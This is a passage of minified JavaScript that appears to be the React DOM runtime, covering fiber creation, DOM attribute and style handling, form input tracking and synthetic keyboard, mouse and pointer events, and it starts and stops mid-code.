e!==0?e:(e=window.event,e===void 0?32:bf(e.type))}function Mr(e,a){var t=N.p;try{return N.p=e,a()}finally{N.p=t}}var dt=Math.random().toString(36).slice(2),Pe="__reactFiber$"+dt,aa="__reactProps$"+dt,al="__reactContainer$"+dt,ss="__reactEvents$"+dt,Vf="__reactListeners$"+dt,Kf="__reactHandles$"+dt,Rr="__reactResources$"+dt,Jl="__reactMarker$"+dt;function os(e){delete e[Pe],delete e[aa],delete e[ss],delete e[Vf],delete e[Kf]}function tl(e){var a=e[Pe];if(a)return a;for(var t=e.parentNode;t;){if(a=t[al]||t[Pe]){if(t=a.alternate,a.child!==null||t!==null&&t.child!==null)for(e=af(e);e!==null;){if(t=e[Pe])return t;e=af(e)}return a}e=t,t=e.parentNode}return null}function ll(e){if(e=e[Pe]||e[al]){var a=e.tag;if(a===5||a===6||a===13||a===31||a===26||a===27||a===3)return e}return null}function Yl(e){var a=e.tag;if(a===5||a===26||a===27||a===6)return e.stateNode;throw Error(p(33))}function il(e){var a=e[Rr];return a||(a=e[Rr]={hoistableStyles:new Map,hoistableScripts:new Map}),a}function Ge(e){e[Jl]=!0}var wr=new Set,zr={};function Ft(e,a){nl(e,a),nl(e+"Capture",a)}function nl(e,a){for(zr[e]=a,e=0;e<a.length;e++)wr.add(a[e])}var Wf=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Fr={},Gr={};function $f(e){return m.call(Gr,e)?!0:m.call(Fr,e)?!1:Wf.test(e)?Gr[e]=!0:(Fr[e]=!0,!1)}function Bi(e,a,t){if($f(a))if(t===null)e.removeAttribute(a);else{switch(typeof t){case"undefined":case"function":case"symbol":e.removeAttribute(a);return;case"boolean":var l=a.toLowerCase().slice(0,5);if(l!=="data-"&&l!=="aria-"){e.removeAttribute(a);return}}e.setAttribute(a,""+t)}}function ki(e,a,t){if(t===null)e.removeAttribute(a);else{switch(typeof t){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(a);return}e.setAttribute(a,""+t)}}function Ja(e,a,t,l){if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttributeNS(a,t,""+l)}}function Ca(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function jr(e){var a=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(a==="checkbox"||a==="radio")}function em(e,a,t){var l=Object.getOwnPropertyDescriptor(e.constructor.prototype,a);if(!e.hasOwnProperty(a)&&typeof l<"u"&&typeof l.get=="function"&&typeof l.set=="function"){var i=l.get,n=l.set;return Object.defineProperty(e,a,{configurable:!0,get:function(){return i.call(this)},set:function(s){t=""+s,n.call(this,s)}}),Object.defineProperty(e,a,{enumerable:l.enumerable}),{getValue:function(){return t},setValue:function(s){t=""+s},stopTracking:function(){e._valueTracker=null,delete e[a]}}}}function rs(e){if(!e._valueTracker){var a=jr(e)?"checked":"value";e._valueTracker=em(e,a,""+e[a])}}function qr(e){if(!e)return!1;var a=e._valueTracker;if(!a)return!0;var t=a.getValue(),l="";return e&&(l=jr(e)?e.checked?"true":"false":e.value),e=l,e!==t?(a.setValue(e),!0):!1}function Ji(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var am=/[\n"\\]/g;function Sa(e){return e.replace(am,function(a){return"\\"+a.charCodeAt(0).toString(16)+" "})}function cs(e,a,t,l,i,n,s,o){e.name="",s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"?e.type=s:e.removeAttribute("type"),a!=null?s==="number"?(a===0&&e.value===""||e.value!=a)&&(e.value=""+Ca(a)):e.value!==""+Ca(a)&&(e.value=""+Ca(a)):s!=="submit"&&s!=="reset"||e.removeAttribute("value"),a!=null?us(e,s,Ca(a)):t!=null?us(e,s,Ca(t)):l!=null&&e.removeAttribute("value"),i==null&&n!=null&&(e.defaultChecked=!!n),i!=null&&(e.checked=i&&typeof i!="function"&&typeof i!="symbol"),o!=null&&typeof o!="function"&&typeof o!="symbol"&&typeof o!="boolean"?e.name=""+Ca(o):e.removeAttribute("name")}function Hr(e,a,t,l,i,n,s,o){if(n!=null&&typeof n!="function"&&typeof n!="symbol"&&typeof n!="boolean"&&(e.type=n),a!=null||t!=null){if(!(n!=="submit"&&n!=="reset"||a!=null)){rs(e);return}t=t!=null?""+Ca(t):"",a=a!=null?""+Ca(a):t,o||a===e.value||(e.value=a),e.defaultValue=a}l=l??i,l=typeof l!="function"&&typeof l!="symbol"&&!!l,e.checked=o?e.checked:!!l,e.defaultChecked=!!l,s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"&&(e.name=s),rs(e)}function us(e,a,t){a==="number"&&Ji(e.ownerDocument)===e||e.defaultValue===""+t||(e.defaultValue=""+t)}function sl(e,a,t,l){if(e=e.options,a){a={};for(var i=0;i<t.length;i++)a["$"+t[i]]=!0;for(t=0;t<e.length;t++)i=a.hasOwnProperty("$"+e[t].value),e[t].selected!==i&&(e[t].selected=i),i&&l&&(e[t].defaultSelected=!0)}else{for(t=""+Ca(t),a=null,i=0;i<e.length;i++){if(e[i].value===t){e[i].selected=!0,l&&(e[i].defaultSelected=!0);return}a!==null||e[i].disabled||(a=e[i])}a!==null&&(a.selected=!0)}}function Pr(e,a,t){if(a!=null&&(a=""+Ca(a),a!==e.value&&(e.value=a),t==null)){e.defaultValue!==a&&(e.defaultValue=a);return}e.defaultValue=t!=null?""+Ca(t):""}function Br(e,a,t,l){if(a==null){if(l!=null){if(t!=null)throw Error(p(92));if(ea(l)){if(1<l.length)throw Error(p(93));l=l[0]}t=l}t==null&&(t=""),a=t}t=Ca(a),e.defaultValue=t,l=e.textContent,l===t&&l!==""&&l!==null&&(e.value=l),rs(e)}function ol(e,a){if(a){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=a;return}}e.textContent=a}var tm=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function kr(e,a,t){var l=a.indexOf("--")===0;t==null||typeof t=="boolean"||t===""?l?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="":l?e.setProperty(a,t):typeof t!="number"||t===0||tm.has(a)?a==="float"?e.cssFloat=t:e[a]=(""+t).trim():e[a]=t+"px"}function Jr(e,a,t){if(a!=null&&typeof a!="object")throw Error(p(62));if(e=e.style,t!=null){for(var l in t)!t.hasOwnProperty(l)||a!=null&&a.hasOwnProperty(l)||(l.indexOf("--")===0?e.setProperty(l,""):l==="float"?e.cssFloat="":e[l]="");for(var i in a)l=a[i],a.hasOwnProperty(i)&&t[i]!==l&&kr(e,i,l)}else for(var n in a)a.hasOwnProperty(n)&&kr(e,n,a[n])}function ds(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var lm=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),im=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Yi(e){return im.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function Ya(){}var fs=null;function ms(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var rl=null,cl=null;function Yr(e){var a=ll(e);if(a&&(e=a.stateNode)){var t=e[aa]||null;e:switch(e=a.stateNode,a.type){case"input":if(cs(e,t.value,t.defaultValue,t.defaultValue,t.checked,t.defaultChecked,t.type,t.name),a=t.name,t.type==="radio"&&a!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll('input[name="'+Sa(""+a)+'"][type="radio"]'),a=0;a<t.length;a++){var l=t[a];if(l!==e&&l.form===e.form){var i=l[aa]||null;if(!i)throw Error(p(90));cs(l,i.value,i.defaultValue,i.defaultValue,i.checked,i.defaultChecked,i.type,i.name)}}for(a=0;a<t.length;a++)l=t[a],l.form===e.form&&qr(l)}break e;case"textarea":Pr(e,t.value,t.defaultValue);break e;case"select":a=t.value,a!=null&&sl(e,!!t.multiple,a,!1)}}}var ps=!1;function Qr(e,a,t){if(ps)return e(a,t);ps=!0;try{var l=e(a);return l}finally{if(ps=!1,(rl!==null||cl!==null)&&(Rn(),rl&&(a=rl,e=cl,cl=rl=null,Yr(a),e)))for(a=0;a<e.length;a++)Yr(e[a])}}function Ql(e,a){var t=e.stateNode;if(t===null)return null;var l=t[aa]||null;if(l===null)return null;t=l[a];e:switch(a){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(l=!l.disabled)||(e=e.type,l=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!l;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(p(231,a,typeof t));return t}var Qa=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),hs=!1;if(Qa)try{var Xl={};Object.defineProperty(Xl,"passive",{get:function(){hs=!0}}),window.addEventListener("test",Xl,Xl),window.removeEventListener("test",Xl,Xl)}catch{hs=!1}var ft=null,gs=null,Qi=null;function Xr(){if(Qi)return Qi;var e,a=gs,t=a.length,l,i="value"in ft?ft.value:ft.textContent,n=i.length;for(e=0;e<t&&a[e]===i[e];e++);var s=t-e;for(l=1;l<=s&&a[t-l]===i[n-l];l++);return Qi=i.slice(e,1<l?1-l:void 0)}function Xi(e){var a=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&a===13&&(e=13)):e=a,e===10&&(e=13),32<=e||e===13?e:0}function Zi(){return!0}function Zr(){return!1}function ta(e){function a(t,l,i,n,s){this._reactName=t,this._targetInst=i,this.type=l,this.nativeEvent=n,this.target=s,this.currentTarget=null;for(var o in e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(n):n[o]);return this.isDefaultPrevented=(n.defaultPrevented!=null?n.defaultPrevented:n.returnValue===!1)?Zi:Zr,this.isPropagationStopped=Zr,this}return I(a.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=Zi)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=Zi)},persist:function(){},isPersistent:Zi}),a}var Gt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Vi=ta(Gt),Zl=I({},Gt,{view:0,detail:0}),nm=ta(Zl),vs,bs,Vl,Ki=I({},Zl,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ys,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Vl&&(Vl&&e.type==="mousemove"?(vs=e.screenX-Vl.screenX,bs=e.screenY-Vl.screenY):bs=vs=0,Vl=e),vs)},movementY:function(e){return"movementY"in e?e.movementY:bs}}),Vr=ta(Ki),sm=I({},Ki,{dataTransfer:0}),om=ta(sm),rm=I({},Zl,{relatedTarget:0}),As=ta(rm),cm=I({},Gt,{animationName:0,elapsedTime:0,pseudoElement:0}),um=ta(cm),dm=I({},Gt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),fm=ta(dm),mm=I({},Gt,{data:0}),Kr=ta(mm),pm={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},hm={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},gm={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function vm(e){var a=this.nativeEvent;return a.getModifierState?a.getModifierState(e):(e=gm[e])?!!a[e]:!1}function ys(){return vm}var bm=I({},Zl,{key:function(e){if(e.key){var a=pm[e.key]||e.key;if(a!=="Unidentified")return a}return e.type==="keypress"?(e=Xi(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?hm[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ys,charCode:function(e){return e.type==="keypress"?Xi(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Xi(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Am=ta(bm),ym=I({},Ki,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Wr=ta(ym),Tm=I({},Zl,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ys}),Em=ta(Tm),Cm=I({},Gt,{propertyName:0,elapsedTime:0,pseudoElement:0}),Sm=ta(Cm),Om=I({},Ki,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),xm=ta(Om),Nm=I({},Gt,{newState:0,oldState:0}),Lm=ta(Nm),Dm=[9,13,27,32],Ts=Qa&&"CompositionEvent"in window,Kl=null;Qa&&"documentMode"in document&&(Kl=document.documentMode);var Im=Qa&&"TextEvent"in window&&!Kl,$r=Qa&&(!Ts||Kl&&8<Kl&&11>=Kl),ec=" ",ac=!1;function tc(e,a){switch(e){case"keyup":return Dm.indexOf(a.keyCode)!==-1;case"keydown":return a.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function lc(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ul=!1;function _m(e,a){switch(e){case"compositionend":return lc(a);case"keypress":return a.which!==32?null:(ac=!0,ec);case"textInput":return e=a.data,e===ec&&ac?null:e;default:return null}}function Um(e,a){if(ul)return e==="compositionend"||!Ts&&tc(e,a)?(e=Xr(),Qi=gs=ft=null,ul=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(a.ctrlKey||a.altKey||a.metaKey)||a.ctrlKey&&a.altKey){if(a.char&&1<a.char.length)return a.char;if(a.which)return String.fromCharCode(a.which)}return null;case"compositionend":return $r&&a.locale!=="ko"?null:a.data;default:return null}}var Mm={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function ic(e){var a=e&&e.nodeName&&e.nodeName.toLowerCase();return a==="input"?!!Mm[e.type]:a==="textarea"}function nc(e,a,t,l){rl?cl?cl.push(l):cl=[l]:rl=l,a=Hn(a,"onChange"),0<a.length&&(t=new Vi("onChange","change",null,t,l),e.push({event:t,listeners:a}))}var Wl=null,$l=null;function Rm(e){Hd(e,0)}function Wi(e){var a=Yl(e);if(qr(a))return e}function sc(e,a){if(e==="change")return a}var oc=!1;if(Qa){var Es;if(Qa){var Cs="oninput"in document;if(!Cs){var rc=document.createElement("div");rc.setAttribute("oninput","return;"),Cs=typeof rc.oninput=="function"}Es=Cs}else Es=!1;oc=Es&&(!document.documentMode||9<document.documentMode)}function cc(){Wl&&(Wl.detachEvent("onpropertychange",uc),$l=Wl=null)}function uc(e){if(e.propertyName==="value"&&Wi($l)){var a=[];nc(a,$l,e,ms(e)),Qr(Rm,a)}}function wm(e,a,t){e==="focusin"?(cc(),Wl=a,$l=t,Wl.attachEvent("onpropertychange",uc)):e==="focusout"&&cc()}function zm(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Wi($l)}function Fm(e,a){if(e==="click")return Wi(a)}function Gm(e,a){if(e==="input"||e==="change")return Wi(a)}function jm(e,a){return e===a&&(e!==0||1/e===1/a)||e!==e&&a!==a}var ma=typeof Object.is=="function"?Object.is:jm;function ei(e,a){if(ma(e,a))return!0;if(typeof e!="object"||e===null||typeof a!="object"||a===null)return!1;var t=Object.keys(e),l=Object.keys(a);if(t.length!==l.length)return!1;for(l=0;l<t.length;l++){var i=t[l];if(!m.call(a,i)||!ma(e[i],a[i]))return!1}return!0}function dc(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function fc(e,a){var t=dc(e);e=0;for(var l;t;){if(t.nodeType===3){if(l=e+t.textContent.length,e<=a&&l>=a)return{node:t,offset:a-e};e=l}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=dc(t)}}function mc(e,a){return e&&a?e===a?!0:e&&e.nodeType===3?!1:a&&a.nodeType===3?mc(e,a.parentNode):"contains"in e?e.contains(a):e.compareDocumentPosition?!!(e.compareDocumentPosition(a)&16):!1:!1}function pc(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var a=Ji(e.document);a instanceof e.HTMLIFrameElement;){try{var t=typeof a.contentWindow.location.href=="string"}catch{t=!1}if(t)e=a.contentWindow;else break;a=Ji(e.document)}return a}function Ss(e){var a=e&&e.nodeName&&e.nodeName.toLowerCase();return a&&(a==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||a==="textarea"||e.contentEditable==="true")}var qm=Qa&&"documentMode"in document&&11>=document.documentMode,dl=null,Os=null,ai=null,xs=!1;function hc(e,a,t){var l=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;xs||dl==null||dl!==Ji(l)||(l=dl,"selectionStart"in l&&Ss(l)?l={start:l.selectionStart,end:l.selectionEnd}:(l=(l.ownerDocument&&l.ownerDocument.defaultView||window).getSelection(),l={anchorNode:l.anchorNode,anchorOffset:l.anchorOffset,focusNode:l.focusNode,focusOffset:l.focusOffset}),ai&&ei(ai,l)||(ai=l,l=Hn(Os,"onSelect"),0<l.length&&(a=new Vi("onSelect","select",null,a,t),e.push({event:a,listeners:l}),a.target=dl)))}function jt(e,a){var t={};return t[e.toLowerCase()]=a.toLowerCase(),t["Webkit"+e]="webkit"+a,t["Moz"+e]="moz"+a,t}var fl={animationend:jt("Animation","AnimationEnd"),animationiteration:jt("Animation","AnimationIteration"),animationstart:jt("Animation","AnimationStart"),transitionrun:jt("Transition","TransitionRun"),transitionstart:jt("Transition","TransitionStart"),transitioncancel:jt("Transition","TransitionCancel"),transitionend:jt("Transition","TransitionEnd")},Ns={},gc={};Qa&&(gc=document.createElement("div").style,"AnimationEvent"in window||(delete fl.animationend.animation,delete fl.animationiteration.animation,delete fl.animationstart.animation),"TransitionEvent"in window||delete fl.transitionend.transition);function qt(e){if(Ns[e])return Ns[e];if(!fl[e])return e;var a=fl[e],t;for(t in a)if(a.hasOwnProperty(t)&&t in gc)return Ns[e]=a[t];return e}var vc=qt("animationend"),bc=qt("animationiteration"),Ac=qt("animationstart"),Hm=qt("transitionrun"),Pm=qt("transitionstart"),Bm=qt("transitioncancel"),yc=qt("transitionend"),Tc=new Map,Ls="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Ls.push("scrollEnd");function Ra(e,a){Tc.set(e,a),Ft(a,[e])}var $i=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var a=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(a))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},Oa=[],ml=0,Ds=0;function en(){for(var e=ml,a=Ds=ml=0;a<e;){var t=Oa[a];Oa[a++]=null;var l=Oa[a];Oa[a++]=null;var i=Oa[a];Oa[a++]=null;var n=Oa[a];if(Oa[a++]=null,l!==null&&i!==null){var s=l.pending;s===null?i.next=i:(i.next=s.next,s.next=i),l.pending=i}n!==0&&Ec(t,i,n)}}function an(e,a,t,l){Oa[ml++]=e,Oa[ml++]=a,Oa[ml++]=t,Oa[ml++]=l,Ds|=l,e.lanes|=l,e=e.alternate,e!==null&&(e.lanes|=l)}function Is(e,a,t,l){return an(e,a,t,l),tn(e)}function Ht(e,a){return an(e,null,null,a),tn(e)}function Ec(e,a,t){e.lanes|=t;var l=e.alternate;l!==null&&(l.lanes|=t);for(var i=!1,n=e.return;n!==null;)n.childLanes|=t,l=n.alternate,l!==null&&(l.childLanes|=t),n.tag===22&&(e=n.stateNode,e===null||e._visibility&1||(i=!0)),e=n,n=n.return;return e.tag===3?(n=e.stateNode,i&&a!==null&&(i=31-fa(t),e=n.hiddenUpdates,l=e[i],l===null?e[i]=[a]:l.push(a),a.lane=t|536870912),n):null}function tn(e){if(50<Ci)throw Ci=0,qo=null,Error(p(185));for(var a=e.return;a!==null;)e=a,a=e.return;return e.tag===3?e.stateNode:null}var pl={};function km(e,a,t,l){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=a,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=l,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function pa(e,a,t,l){return new km(e,a,t,l)}function _s(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Xa(e,a){var t=e.alternate;return t===null?(t=pa(e.tag,a,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=a,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&65011712,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,a=e.dependencies,t.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t.refCleanup=e.refCleanup,t}function Cc(e,a){e.flags&=65011714;var t=e.alternate;return t===null?(e.childLanes=0,e.lanes=a,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=t.childLanes,e.lanes=t.lanes,e.child=t.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=t.memoizedProps,e.memoizedState=t.memoizedState,e.updateQueue=t.updateQueue,e.type=t.type,a=t.dependencies,e.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext}),e}function ln(e,a,t,l,i,n){var s=0;if(l=e,typeof e=="function")_s(e)&&(s=1);else if(typeof e=="string")s=Zp(e,t,R.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case ca:return e=pa(31,t,a,i),e.elementType=ca,e.lanes=n,e;case me:return Pt(t.children,i,n,a);case Ke:s=8,i|=24;break;case Y:return e=pa(12,t,a,i|2),e.elementType=Y,e.lanes=n,e;case ya:return e=pa(13,t,a,i),e.elementType=ya,e.lanes=n,e;case we:return e=pa(19,t,a,i),e.elementType=we,e.lanes=n,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case qe:s=10;break e;case $e:s=9;break e;case ra:s=11;break e;case K:s=14;break e;case He:s=16,l=null;break e}s=29,t=Error(p(130,e===null?"null":typeof e,"")),l=null}return a=pa(s,t,a,i),a.elementType=e,a.type=l,a.lanes=n,a}function Pt(e,a,t,l){return e=pa(7,e,l,a),e.lanes=t,e}function Us(e,a,t){return e=pa(6,e,null,a),e.lanes=t,e}function Sc(e){var a=pa(18,null,null,0);return a.stateNode=e,a}function Ms(e,a,t){return a=pa(4,e.children!==null?e.children:[],e.key,a),a.lanes=t,a.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},a}var Oc=new WeakMap;function xa(e,a){if(typeof e=="object"&&e!==null){var t=Oc.get(e);return t!==void 0?t:(a={value:e,source:a,stack:Gi(a)},Oc.set(e,a),a)}return{value:e,source:a,stack:Gi(a)}}var hl=[],gl=0,nn=null,ti=0,Na=[],La=0,mt=null,Ga=1,ja="";function Za(e,a){hl[gl++]=ti,hl[gl++]=nn,nn=e,ti=a}function 